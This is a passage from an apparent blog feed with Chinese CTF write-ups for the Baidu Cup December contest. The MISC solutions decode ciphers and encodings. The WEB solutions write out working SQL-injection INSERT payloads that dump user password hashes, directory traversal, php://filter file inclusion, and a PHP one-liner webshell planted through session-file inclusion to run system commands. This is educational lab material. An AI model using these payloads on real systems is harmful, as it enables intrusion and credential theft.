class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">copy(<span class="string">"/var/www/html/flag.php"</span>,<span class="string">"/tmp/flag.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?module=../../../../../../../tmp/flag.txt</span><br><span class="line">&amp;name=txt</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA-blog%E8%BF%9B%E9%98%B6%E7%89%88.assets/1534241282118.png" alt="1534241282118"></p><p>flag去哪啦~</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533895701193.png" alt="1533895701193"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Blog-进阶篇&quot;&gt;&lt;a href=&quot;#Blog-进阶篇&quot; class=&quot;headerlink&quot; title=&quot;Blog 进阶篇&quot;&gt;&lt;/a&gt;Blog 进阶篇&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Blog赛题是由melody设计的&lt;/p&gt;
&lt;p&gt;十二月的百度杯挑战赛上线的是优化难度后的比赛&lt;/p&gt;
&lt;p&gt;Blog·进阶篇 则是作者的原题，难度比挑战赛上线了几个梯度。&lt;/p&gt;
&lt;p&gt;快来挑战吧！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;从读网站上某个文件的角度去考虑，有以下几个角度：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;php伪协议包含读文件内容&lt;/li&gt;
&lt;li&gt;上传webshell，执行命令读文件&lt;/li&gt;
&lt;li&gt;上传php，读特定文件&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="-Web安全 -I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8-I%E6%98%A5%E7%A7%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>百度杯 十二月场</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/百度杯 十二月场/</id>
    <published>2018-08-10T12:06:47.000Z</published>
    <updated>2018-08-14T11:09:59.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><blockquote><p>话不多说，看图片 </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/misc1.jpg" alt="misc1"></p><a id="more"></a><p>16进制查看，在最后</p><blockquote><p> flag{stego_is_s0_bor1ing} </p></blockquote><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/kaixin.jpg" alt="kaixin"></p><p>试了几种隐写发现不对，看看writeup，说是猪圈密码</p><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。 </p><p><img src="https://static2.ichunqiu.com/icq/resources/fileupload/1517198320154.png" alt="undefined"> </p><blockquote><p>flag{NSN}</p></blockquote><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><blockquote><p>哒哒哒哒，你知道什么是键盘坐标密码吗？</p><p>11 21 31 18 27 33 34</p><p>flag格式：flag{<strong>*</strong>}</p></blockquote><blockquote><p>flag{QAZIJCV}</p></blockquote><h2 id="一个十六岁的少年"><a href="#一个十六岁的少年" class="headerlink" title="一个十六岁的少年"></a>一个十六岁的少年</h2><blockquote><p>有一天，表姐的好朋友贝丝远房的表亲，一个16岁的少年</p><p>给表姐递了一封情书，表姐看不懂，你能帮忙翻译下吗？</p><p>666C61677B65633862326565302D336165392D346332312D613031322D3038616135666137626536377D</p></blockquote><p>base16</p><blockquote><p>flag{ec8b2ee0-3ae9-4c21-a012-08aa5fa7be67}</p></blockquote><h2 id="吃货"><a href="#吃货" class="headerlink" title="吃货"></a>吃货</h2><blockquote><p>麻辣烫的标配</p><p>flag{abbab_babbb_baaaa_aaabb}</p></blockquote><p>培根密码</p><blockquote><p>flag{N_X_Q_D}</p></blockquote><h2 id="福尔摩斯"><a href="#福尔摩斯" class="headerlink" title="福尔摩斯"></a>福尔摩斯</h2><blockquote><p>贝克街旁的圆形广场</p><p>·-· ·-· ·-· ·-· ·-· ·-· ·</p><p>flag格式：flag{<strong><strong>*</strong></strong>}</p></blockquote><blockquote><p>flag{RRRRRRE}</p></blockquote><h2 id="——"><a href="#——" class="headerlink" title="+——+"></a>+——+</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- --.+. ----- -.&lt;++</span><br><span class="line">+++++ [-&gt;++ +++++ &lt;]&gt;++ ++.-- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- .----</span><br><span class="line">--.++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; --.++ +++.+ +++.- .&lt;+++ +++[- &gt;++++ ++&lt;]&gt;</span><br><span class="line">+++++ +++.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ---.+ +++++ +.+++ ++.-- ----- .&lt;+++</span><br><span class="line">++++[ -&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- .&lt;+++ ++++[</span><br><span class="line">-&gt;+++ ++++&lt; ]&gt;+++ .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;.++ ++.-- -.--- -.&lt;++ +++++</span><br><span class="line">[-&gt;++ +++++ &lt;]&gt;++ ++.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----- ---.- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ..&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.-- -.+.+ ++.-- ---.+</span><br><span class="line">++++. ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;</span><br></pre></td></tr></table></figure><p>brankfuck在线解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><blockquote><p>flag{671fb608-265a-492f-a041-b30bb8569490}</p></blockquote><h2 id="misc1-纵横四海"><a href="#misc1-纵横四海" class="headerlink" title="misc1-纵横四海"></a>misc1-纵横四海</h2><blockquote><p>有句话说的好</p><p>（大表姐最美）</p><p>。</p><p>。</p><p>。</p><p>。</p><p>。</p><p>天下分久必合，合久必分</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/tiaoxiwoya_F738231D64472CF1476F941699E20618.zip" target="_blank" rel="noopener">附件下载</a> </p></blockquote><p>附件解压是很多txt，每个txt有一个字符</p><p>写个python把它们合在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/8/10</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : misc1-纵横四海</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">r'F:\CTF\I春秋的CTF大本营\百度杯十二月场\MISC\tiaoxiwoya'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(path, topdown=<span class="keyword">False</span>):</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">with</span> open(os.path.join(root, name)) <span class="keyword">as</span> f:</span><br><span class="line">            flag += f.readline()[:<span class="number">1</span>]</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for name in dirs:</span></span><br><span class="line">    <span class="comment">#     print(os.path.join(root, name))</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{0a47061d-0619-4932-abcd-5426f4ea34aa}</p></blockquote><h2 id="misc2-对错"><a href="#misc2-对错" class="headerlink" title="misc2-对错"></a>misc2-对错</h2><blockquote><p>如果说1代表对，0代表错，那么-1代表？ </p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/duicuo_DCA74A67DC1C2C2A43E6F7F0AE6236DE.txt" target="_blank" rel="noopener">附件下载</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101111010011010000100010101100011001110010011000000110011001101000110101001101111011001000111001101101010011001100110111101110011011010110110111101111101</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(int(&apos;011001100110110001100001011001110111101101111010011010000100010101100011001110010011000000110011001101000110101001101111011001000111001101101010011001100110111101110011011010110110111101111101&apos;,2))</span><br><span class="line">&apos;0x666c61677b7a684563393033346a6f64736a666f736b6f7dL&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; binascii.a2b_hex(&apos;666c61677b7a684563393033346a6f64736a666f736b6f7d&apos;)</span><br><span class="line">&apos;flag&#123;zhEc9034jodsjfosko&#125;&apos;</span><br></pre></td></tr></table></figure><blockquote><p>flag{zhEc9034jodsjfosko}</p></blockquote><h2 id="misc3-枯竭"><a href="#misc3-枯竭" class="headerlink" title="misc3-枯竭"></a>misc3-枯竭</h2><blockquote><p>讲真的，才华已经枯竭</p><p>大家好好答题</p><p>也许这道题一点都不坑</p><p>也许。。。。。</p><p><a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/BSRC12-4/misc3_BDAE109BD7B51BF98BA9BB501C0F45C2.zip" target="_blank" rel="noopener">附件下载</a></p></blockquote><p><code>也许</code> 后面的五个点暗示五位数</p><p>ARCHPR 暴力破解一下五位数的数字</p><blockquote><p>flag{319b7f63-e17d-4ac5-8428-c2476c7ecce3}</p></blockquote><h2 id="藏在邮件头里的秘密"><a href="#藏在邮件头里的秘密" class="headerlink" title="藏在邮件头里的秘密"></a>藏在邮件头里的秘密</h2><blockquote><p> flag{ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6} </p></blockquote><p>可打印字符编码(Quoted_Printable)</p><p> <a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a>  </p><p><a href="http://blog.chacuo.net/494.html" target="_blank" rel="noopener"><strong>Quoted-printable</strong></a>可译为“可打印字符引用编码”，编码常用在电子邮件中，如：Content-Transfer-Encoding: quoted-printable ，它是MIME编码常见一种表示方法！ 在邮件里面我们常需要用可打印的ASCII字符 (如字母、数字与”=”)表示各种编码格式下的字符！Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”=”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”=0C”， 等号”=”（十进制值为61）必须表示为”=3D”，gb2312下“中”表示为=D6=D0。除了可打印ASCII字符与换行符以外，所有字符必须表示为这种格式。因为Quoted-printable编码简单、方便因此在电子邮件中应用广泛！ </p><blockquote><p>flag{ichunqiu_技术有温度}</p></blockquote><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h2><blockquote><p>请帮我测试一下刚写的Blog </p></blockquote><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul><li>kindeditor编辑器目录遍历，</li><li>insert注入</li><li>文件包含</li></ul><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>上传个图片，爆出编辑器为kindeditor</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533874138592.png" alt="1533874138592"></p><p>搜一下kindeditor编辑器的漏洞，有个目录遍历漏洞</p><p><a href="https://www.jb51.net/hack/367858.html" target="_blank" rel="noopener">Kindeditor遍历目录0DAY问题</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/67cms/kindeditor/php/file_manager_json.php?path=../</span><br></pre></td></tr></table></figure><p>发现flag.php在网站根目录，还有个robots.txt，打开也是暗示flag.php</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533874524721.png" alt="1533874524721"></p><p>然后思路就是怎么读取flag.php</p><p>发现post.php 有注入点</p><p>在content参考后加 单引号出错</p><p>猜想后台sql语句形似:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO TABLENAME(A,B,C) VALUES($A,$B,$C);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title=111&amp;content=111&apos;)#          出错</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;)#      成功</span><br></pre></td></tr></table></figure><p>那么猜测 insert的参数有四个，第四个参数没有在页面显示出来，就控制content来显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, title,content,username)</span><br></pre></td></tr></table></figure><p>insert注入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">测试成功，但页面没有出现内容</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;aaa&apos;,&apos;X&apos;,&apos;X&apos; ,&apos;xx&apos;)#       </span><br><span class="line">出现内容，最后一个为用户名</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihaiaaaaaaaaaaaaaaaaaaaaaa&apos;,&apos; &apos; ,&apos;Lhaihai&apos;)#</span><br><span class="line">显示数据库为miniblog</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(database()) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆表  posts,users</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(table_name) from information_schema.tables where table_schema = database()) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆users字段:username,password</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273) ,&apos;Lhaihai&apos;)#</span><br><span class="line">爆post字段: id,title,content,username</span><br><span class="line"></span><br><span class="line">爆出密码</span><br><span class="line">title=111&amp;content=111&apos;,&apos;X&apos;),(&apos;XXX&apos;,&apos;Lhaihai&apos;,(select group_concat(password) from users) ,&apos;Lhaihai&apos;)#</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">dbb616c5d935d8f34c12c291066d6fb7</span><br></pre></td></tr></table></figure><p>md5解密得密码 </p><blockquote><p>melody123 </p></blockquote><p>管理员账号登录，多了个manager.php</p><p>module参数可以包含并且可以用php://filter协议可直接读 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b0a5692172d24de4b205c5d66faf7a5162182fa8404d4518.game.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</span><br></pre></td></tr></table></figure><blockquote><p>PD9waHAgCidmbGFne2E1N2NiYTgxLWNhMDgtNDRlYS1hOWY1LWRhNDZmYjVkNDAxY30nOwplY2hvICdmbGFnX2lzX2hlcmUnOwo=</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="string">'flag&#123;a57cba81-ca08-44ea-a9f5-da46fb5d401c&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag_is_here'</span>;</span><br></pre></td></tr></table></figure><p>做了两遍发现flag是随机的</p><blockquote><p>flag{a57cba81-ca08-44ea-a9f5-da46fb5d401c}</p><p>flag{a8f3801d-27e8-45aa-9f80-0b7bd6d72c1e}</p></blockquote><p>参考链接</p><p><a href="https://blog.csdn.net/qq_30123355/article/details/58161312" target="_blank" rel="noopener">https://blog.csdn.net/qq_30123355/article/details/58161312</a></p><p><a href="https://www.cnblogs.com/Ragd0ll/p/8778562.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ragd0ll/p/8778562.html</a></p><h2 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h2><blockquote><p>看看我的Notebook</p><p>tips： 文件包含phpinfo是不是有新的发现</p></blockquote><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><ul><li>包含session</li><li>session真正位置</li><li>文件包含漏洞 </li></ul><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h5><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p><h5 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h5><ol><li>/var/lib/php5/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><p>PHPSESSID就是Cookie的PHPSESSID的值</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533897832368.png" alt="1533897832368"></p><h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><p>登录注册题目，一般思路就是注入，如果不是注入就是session漏洞  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=php&amp;file=login</span><br></pre></td></tr></table></figure><p>看一下url，module，file参数，疯狂暗示文件包含</p><p>测试一波，发现module的php部分换成其他任何的值，我们都可以控制要包含文件的后缀，默认php的情况下，是会在file后面加上php的。 </p><p>尝试一下robots.txt </p><p>提示：php1nFo.php</p><p>访问就是phpinfo();</p><p>发现开启了open_basedir:    /var/www/html/:/tmp </p><blockquote><p>open_basedir 将<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开 </p></blockquote><p>再看看</p><p>session.save_path 是    /var/lib/php5</p><p>这时session.save_path不在open_basedir里面，我们不能包含session文件</p><p>脑洞一下包含php1nFo，发现新目录，而且在open_basedir范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action.php?module=php&amp;file=php1nFo</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533897637938.png" alt="1533897637938"></p><p>所以我们session文件就保存在 <code>tmp/SESS/sess_PHPSESSID</code>里</p><p>如果题目信息没有给session保存的路径，可以猜测知识点的几个值</p><p>访问一下，</p><p>会出现当前登录的用户名</p><p>于是我们注册一个一句话木马的用户，就可以getshell了</p><p>创建一个 <code>&lt;?php $_GET[&#39;a&#39;](base64_decode($_GET[&#39;b&#39;]));?&gt;</code>用户</p><blockquote><p>这里为什么要用base64解码呢<br>我尝试eval的一句话木马，执行不了<br>或许被过滤了什么的</p><p><code>&lt;?php eval(base64_decode($_GET[&#39;b&#39;]));?&gt;</code></p><p>可以执行phpinfo();，但system(‘ls ./‘)不执行成功</p><p><code>&lt;?php eval($_GET[&#39;Lhaihai&#39;]);?&gt;</code></p><p>一句话木马也是能执行phpinfo();，不能system</p><p>或者直接这样子也可以</p><p><code>&lt;?php system(base64_decode($_GET[&#39;b&#39;]));?&gt;</code></p><p>再试试</p><p><code>&lt;?php system($_GET[&#39;b&#39;]);?&gt;</code></p><p>发现这个也可以</p><p>所以就是eval()函数不成功 ？？？</p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533895701193.png" alt="1533895701193"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_0bk9ojm7oh28jpjarr08aduc24&amp;a=system&amp;b=bHMgLi8K</span><br><span class="line"></span><br><span class="line">http://f4adf1900e344025b41f951eef0cac04db4d0a6e32914a48.game.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_0bk9ojm7oh28jpjarr08aduc24&amp;a=system&amp;b=Y2F0IGZsYWcucGhwCg==</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533887640624.png" alt="1533887640624"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/1533887669933.png" alt="1533887669933"></p><blockquote><p>flag{87e7131d-0650-4e69-a48b-ee4f1a21da39}</p></blockquote><p>参考链接</p><p><a href="https://bbs.ichunqiu.com/thread-16750-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-16750-1-1.html</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/52602454" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/52602454</a></p><p><a href="https://www.cnblogs.com/Oran9e/p/8082962.html" target="_blank" rel="noopener">CTF PHP文件包含–session</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession" target="_blank" rel="noopener">php文件包含漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;misc1&quot;&gt;&lt;a href=&quot;#misc1&quot; class=&quot;headerlink&quot; title=&quot;misc1&quot;&gt;&lt;/a&gt;misc1&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;话不多说，看图片 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%20%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA.assets/misc1.jpg&quot; alt=&quot;misc1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="I春秋" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/I%E6%98%A5%E7%A7%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>2018年8月</title>
    <link href="http://blog.Lhaihai.wang/2018/08/10/2018%E5%B9%B48%E6%9C%88/"/>
    <id>http://blog.Lhaihai.wang/2018/08/10/2018年8月/</id>
    <published>2018-08-10T11:06:47.000Z</published>
    <updated>2018-08-24T18:18:46.151Z</updated>
    
